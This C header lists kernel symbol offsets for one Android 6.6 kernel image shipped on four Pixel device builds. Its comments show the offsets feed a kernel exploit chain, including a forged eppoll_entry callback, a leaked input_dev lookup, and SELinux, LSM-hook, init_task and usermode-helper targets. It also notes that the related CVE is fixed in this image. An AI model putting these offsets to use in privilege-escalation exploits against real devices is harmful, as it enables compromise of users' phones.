/* android15-6.6-ab15266607 -- offsets into one kernel image, shared by every build that ships it.
 *
 * Named for the banner that identifies the image, which is the thing these
 * are offsets into:
 *
 *   Linux version 6.6.118-android15-8-g53e6e091166e-ab15266607-4k
 *
 * Shipped by 4 of the device-builds in data/targets.json, whose Images are
 * byte-identical (md5 194a711bff97):
 *
 *   blazer-CP2A.260705.006
 *   frankel-CP2A.260705.006
 *   mustang-CP2A.260705.006
 *   rango-CP2A.260705.006
 *
 * CVE-2026-43049 is fixed in this image: hidpp_probe() carries the `ret = 0` of
 * upstream f7a4c78bfeb3 (ACK 20130e92480a, 2026-03-23), so the failed
 * force-feedback probe leaks no input_dev and the chain built on that leak does
 * not apply here. The three offsets it reads are stated anyway, because they are
 * facts about the image.
 *
 * A symbol offset is a fact about an image, not about a phone, which is why it
 * is stated once here rather than per device: one image, one set of values, one
 * place to correct them.
 *
 * Derived by tools/pixel-image/derive_offsets.py from the image itself; the
 * same command re-derives them, and --compare checks a committed header
 * against the image it claims to describe.
 */
#ifndef ANDROID15_6_6_AB15266607_H
#define ANDROID15_6_6_AB15266607_H

/* the wake callback a forged eppoll_entry names as its .func */
#ifndef EP_POLL_CALLBACK_OFF
#define EP_POLL_CALLBACK_OFF        0x00432bd8ULL
#endif
/* the version string, as a read target that identifies itself */
#ifndef LINUX_BANNER_OFF
#define LINUX_BANNER_OFF            0x0134c0c0ULL
#endif
/* every registered input_dev is on this list, so a leaked one is findable by name */
#ifndef INPUT_DEV_LIST_OFF
#define INPUT_DEV_LIST_OFF          0x0226db78ULL
#endif

#ifndef ASHMEM_IOCTL_OFF
#define ASHMEM_IOCTL_OFF            0x00c8d908ULL
#endif
#ifndef ASHMEM_MMAP_OFF
#define ASHMEM_MMAP_OFF             0x00c8e018ULL
#endif
#ifndef ASHMEM_OPEN_OFF
#define ASHMEM_OPEN_OFF             0x00c8e238ULL
#endif
#ifndef ASHMEM_RELEASE_OFF
#define ASHMEM_RELEASE_OFF          0x00c8e2c0ULL
#endif
#ifndef ASHMEM_SHOW_FDINFO_OFF
#define ASHMEM_SHOW_FDINFO_OFF      0x00c8e34cULL
#endif
#ifndef ASHMEM_MISC_FOPS_OFF
#define ASHMEM_MISC_FOPS_OFF        0x0228c568ULL
#endif
#ifndef ASHMEM_FOPS_OFF
#define ASHMEM_FOPS_OFF             0x012f74c0ULL
#endif
#ifndef ASHMEM_COMPAT_IOCTL_OFF
#define ASHMEM_COMPAT_IOCTL_OFF     0x00c8dfc4ULL
#endif
#ifndef CONFIGFS_READ_ITER_OFF
#define CONFIGFS_READ_ITER_OFF      0x00491eecULL
#endif
#ifndef CONFIGFS_BIN_WRITE_ITER_OFF
#define CONFIGFS_BIN_WRITE_ITER_OFF 0x00492418ULL
#endif
#ifndef COPY_SPLICE_READ_OFF
#define COPY_SPLICE_READ_OFF        0x00415be0ULL
#endif
#ifndef NOOP_LLSEEK_OFF
#define NOOP_LLSEEK_OFF             0x003c8940ULL
#endif
#ifndef INIT_TASK_OFF
#define INIT_TASK_OFF               0x0212e280ULL
#endif
#ifndef ROOT_TASK_GROUP_OFF
#define ROOT_TASK_GROUP_OFF         0x02328980ULL
#endif
#ifndef SELINUX_ENFORCING_OFF
#define SELINUX_ENFORCING_OFF       0x0236a2e0ULL
#endif
#ifndef SELINUX_BLOB_SIZES_OFF
#define SELINUX_BLOB_SIZES_OFF      0x016849b0ULL
#endif
#ifndef SECURITY_HOOK_HEADS_OFF
#define SECURITY_HOOK_HEADS_OFF     0x01684278ULL
#endif
#ifndef KMALLOC_CACHES_OFF
#define KMALLOC_CACHES_OFF          0x01683db8ULL
#endif
#ifndef EP_POLL_CALLBACK_OFF
#define EP_POLL_CALLBACK_OFF        0x00432bd8ULL
#endif
#ifndef LINUX_BANNER_OFF
#define LINUX_BANNER_OFF            0x0134c0c0ULL
#endif
#ifndef INPUT_DEV_LIST_OFF
#define INPUT_DEV_LIST_OFF          0x0226db78ULL
#endif
#ifndef ANON_PIPE_BUF_OPS_OFF
#define ANON_PIPE_BUF_OPS_OFF       0x01176748ULL
#endif
#ifndef CALL_USERMODEHELPER_EXEC_WORK_OFF
#define CALL_USERMODEHELPER_EXEC_WORK_OFF 0x000d1028ULL
#endif
#ifndef SYSTEM_UNBOUND_WQ_OFF
#define SYSTEM_UNBOUND_WQ_OFF       0x0211ae60ULL
#endif
#ifndef SLIDE_NFULNL_LOGGER_OFF
#define SLIDE_NFULNL_LOGGER_OFF     0x02122260
#endif
#ifndef SLIDE_TRACE_MARK_IP_OFF
#define SLIDE_TRACE_MARK_IP_OFF     0x001f4c8cULL
#endif
#ifndef SLIDE_LOGGERS_0_1_OFF
#define SLIDE_LOGGERS_0_1_OFF       0x021221b0ULL
#endif
#ifndef SLIDE_RANDOM_BOOT_ID_DATA_OFF
#define SLIDE_RANDOM_BOOT_ID_DATA_OFF 0x02249468ULL
#endif
#ifndef SLIDE_SYSCTL_BOOTID_OFF
#define SLIDE_SYSCTL_BOOTID_OFF     0x0238b2d8ULL
#endif

#endif /* ANDROID15_6_6_AB15266607_H */
